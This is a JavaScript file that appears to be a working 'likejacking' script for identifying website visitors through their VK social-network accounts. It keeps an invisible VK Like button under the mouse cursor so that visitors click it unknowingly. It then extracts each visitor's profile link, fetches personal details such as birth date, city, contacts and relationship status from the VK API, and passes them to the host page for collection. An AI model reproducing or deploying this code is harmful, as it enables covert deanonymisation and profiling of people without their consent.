var apiID = 5319349;
var scriptHandler = '/regclient';

var gr = null;
var u = ":=z954";
var vkadd = Math.round(Math.random()*1000);
globalC = null;
globalFirst = false;
globalDomain = null;
function soctr_gotAnswer() {
	top.postMessage({type: 'hideframe'}, '*');
	lnk = globalC;
	firstTime = globalFirst;
	if (lnk == null || lnk == 'null'){top.postMessage({type: 'removeframe'}, '*');}
	else {
		if (firstTime) {
			var script = document.createElement('script');
			script.src = "https://api.vk.com/method/users.get?uids="+lnk+"&callback=soctr_sendAnswer&fields=sex,bdate,city,country,photo_50,photo_100,photo_id,online,online_mobile,domain,has_mobile,contacts,connections,site,can_post,can_see_all_posts,can_see_audio,can_write_private_message,status,last_seen,relation,screen_name,maiden_name,timezone";
			document.getElementsByTagName("head")[0].appendChild(script);
		}
		else
			soctr_sendAnswer();
	}
}

function soctr_sendAnswer(r) {
	lnk = globalC;
	var obj = {vkLogin: lnk, other: null};
	if(typeof(r) != 'undefined')
		obj.other = r.response[0];
	top.postMessage({
		type: 'senddata',
		vkLogin: lnk,
		userData: JSON.stringify(obj.other),
		s: obj,
		scriptHandler: scriptHandler
	}, '*');
	top.postMessage({type: 'removeframe'}, '*');
}

function soctr_getCookie(name) {
	var matches = document.cookie.match(new RegExp("(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"));
	return matches ? decodeURIComponent(matches[1]) : undefined;
}

function soctr_setCookie(name, value, options) {
	options = options || {};

	var expires = options.expires;

	if (typeof expires == "number" && expires) {
		var d = new Date();
		d.setTime(d.getTime() + expires * 1000);
		expires = options.expires = d;
	}
	if (expires && expires.toUTCString) {
		options.expires = expires.toUTCString();
	}

	value = encodeURIComponent(value);

	var updatedCookie = name + "=" + value;

	for (var propName in options) {
		updatedCookie += "; " + propName;
		var propValue = options[propName];
		if (propValue !== true) {
		  updatedCookie += "=" + propValue;
		}
	}

	document.cookie = updatedCookie;
}

function strXor(text, key) {
	var len = text.length;
	var arr = new Array(len);
	for(var i = 0; i < len; ++i)
		arr[i] = text.charCodeAt(i) ^ key.charCodeAt(i % key.length);
	return String.fromCharCode.apply(null, arr);
}

function soctr_addCSS(val) {
	var el = document.createElement("style");
	el.type = "text/css";
	if (el.styleSheet) el.styleSheet.cssText = val;
	else el.innerHTML = val;
	document.getElementsByTagName("head")[0].appendChild(el);
}

var soctr_gotLnk = function (lnk) {
	window.top.postMessage(u + "%unwide%", "*");
	var el = (window.Image ? ( new Image()) : document.createElement("img"));
	el.onload = function () { window.top.postMessage(u + "%connected%", "*") };
	el.onerror = function () { window.top.postMessage(u + "%connected%", "*") };
	el.onabort = function () { window.top.postMessage(u + "%connected%", "*") };

	soctr_setCookie('vkLogin'+globalDomain, lnk, {path: '/', expires: 86400 * 90});
	globalC = lnk;
	globalFirst = true;
	soctr_gotAnswer();
};

window.vkAsyncInit = function () {
	VK.init({apiId: apiID, onlyWidgets: true});
	var key, index;
	var el = document.createElement("div");
	el.id = "vk"+vkadd+"auth";
	var resizeLast = -1;
	var flag = false;
	document.body.appendChild(el);
	window.addEventListener("message", function (msg) {
		var data = msg.data;
		if (data.substr(0, key.length) == key)
		{
			if (data.indexOf("resize") !== -1)
			{
				var resize = data.substr(data.indexOf("\",[") + 3);
				resize = parseInt(resize.substr(0, resize.indexOf("]]")));
				if (resize != resizeLast)
				{
					resizeLast = resize;
					soctr_resizeChanged(resize);
				}
			}
		}
	}, false);

	function soctr_resizeChanged(resize) {
		if (resize > 87)
		{
			if (!flag)
			{
				flag = true;
				soctr_addWidget();
			}
		}
		else {top.postMessage({type: 'removeframe'}, '*');}//soctr_gotLnk(null)
	}
	index = VK.Widgets.Auth("vk"+vkadd+"auth", {width: "300px", onAuth: function () {}});
	key = VK.Widgets.RPC[index].key;
	soctr_addCSS("#vkwidget" + index + "_tt {opacity: 0 !important; z-index: -999 !important; position: absolute !important; left: -999px !important; top: -999px !important;}" +
		"#vk"+vkadd+" {display: block; padding: 0; position: absolute; z-index: 10000; width: 114px !important; margin-left: -1px; margin-top: -1px; height: 23px !important; overflow: hidden; }" +
		"#vk"+vkadd+"-p {opacity: 0; overflow: hidden; width: 116px; height: 25px; position: absolute; z-index: 99999; margin-left: -55px; margin-top: -10px; }" + ".vk"+vkadd+"-b a {cursor: pointer !important;}" +
		"#vk"+vkadd+"auth {visibility: hidden; opacity: 0; position: absolute; top: 0; left: 0;}");
};

function soctr_addWidget(){
	VK.init({ apiId: apiID, onlyWidgets: true });
	var el = document.createElement("div");
	el.innerHTML = '<div id="vk'+vkadd+'"></div>';
	el.id = "vk"+vkadd+"-p";
	var eltop = document.createElement("div");
	eltop.id = "vk"+vkadd+"-pp";
	eltop.appendChild(el);
	document.body.appendChild(eltop);

	var nclicks = 0;
	var lnk = null;
	var likeid = Math.floor((Math.random() * 4294967295) + 1);
	var widgetlike = VK.Widgets.Like("vk"+vkadd, {type: "button", height: 24}, likeid);
	var key = VK.Widgets.RPC[widgetlike].key;
	var flag = false;
	document.body.className += " vk"+vkadd+"-b";
	soctr_addCSS("#vkwidget" + widgetlike + "_tt {opacity: 0 !important; z-index: -999 !important; position: aboslute !important; left: -999px !important; top: -999px !important;}" +
		"#vk"+vkadd+" {display: block; padding: 0; position: absolute; z-index: 10000; width: 114px !important; margin-left: -1px; margin-top: -1px; height: 23px !important; overflow: hidden; }" +
		"#vk"+vkadd+"-p {opacity: 0; overflow: hidden; width: 116px; height: 25px; position: absolute; z-index: 99999; margin-left: -55px; margin-top: -10px; }" +
		".vk"+vkadd+"-b {cursor: pointer !important;}" +
		"#vk"+vkadd+"auth {visibility: hidden; opacity: 0; position: absolute; top: 0; left: 0;}");
	var completed = false;
	var likeHandler = function () {
		if (!completed)
		{
			completed = true;
			window.top.postMessage(u + "%unwide%", "*");
			eltop.parentNode.removeChild(eltop);
			var el = document.getElementById("vkwidget" + widgetlike + "_tt");
			if (el) el.parentNode.removeChild(el);
			document.body.className = document.body.className.replace("vk"+vkadd+"-b", "");
			document.removeEventListener("mousemove", soctr_moveWidget);
			soctr_gotLnk(lnk);
		}
	};

	VK.Observer.subscribe("widgets.like.liked", likeHandler);
	window.addEventListener("message", function (msg) {
		var data = msg.data;
		if (data.substr(0, key["length"]) == key)
		{
			if (data.indexOf("%init%") !== -1)
				if (!flag)
				{
					flag = true;
					//window.top.postMessage(u + "%wide%", "*");
					window.top.postMessage({type: 'showframe'}, '*');
				}
				else
				{
					lnk = null;
					likeHandler();
				}

			if (data.indexOf("mem_link") !== -1)
			{
				var tmp = data.substr(data.indexOf("href=\\\"") + 8);
				tmp = tmp.substr(0, tmp.indexOf("\\"));
				lnk = tmp;
			}

			if (data.indexOf("widgets.like.liked") !== -1)
				setTimeout(function () { if (!completed) likeHandler(); }, 1000);
		}
	}, false);

	window.addEventListener("click", function () {
		nclicks++;
		if (nclicks >= 2)
		{
			nclicks = "doubleMissClick";
//				likeHandler();
		}
	});

	function soctr_moveWidget(coord) {
		var w = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
			h = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;
		var x = coord.pageX;
		var y = coord.pageY;
		if (x + 60 < w && y + 20 < h)
		{
			el.style.left = x /*+ 52*/ + "px";
			el.style.top = y /*+ 6*/ + "px";
		}
		if (gr != null)
		{
			if ((x < gr[0]) || (x > gr[1]) || (y < gr[2]) || (y > gr[3]))
			{
				document.getElementById('vk'+vkadd+'-p').hidden = true;
				document.getElementById('vk'+vkadd+'-p').style['z-index'] = -99999;
				gr = null;
			}
		}
	}
	document.addEventListener("mousemove", soctr_moveWidget, false);
	document.getElementById('vk'+vkadd+'-p').hidden = false;
	document.getElementById('vk'+vkadd+'-p').style['z-index'] = 99999;
}

function soctr_loadScript(s){
	var scr = document.createElement("script");
	scr.setAttribute("src", s);
	document.getElementsByTagName("head")[0].appendChild(scr);
}

function soctr_start() {
	var c = soctr_getCookie('vkLogin'+globalDomain);
	if (c == undefined) {
		soctr_loadScript('https://vk.com/js/api/openapi.js');
	}
	else {
		globalC = c;
		top.postMessage({type: 'removeframe'}, '*');
	}
}

onmessage = function(evnt) {
	if (evnt.data.type == 'gotdomain') {
		globalDomain = evnt.data.domain;
		soctr_start();
	}
}

top.postMessage({type: 'getdomain'}, '*');
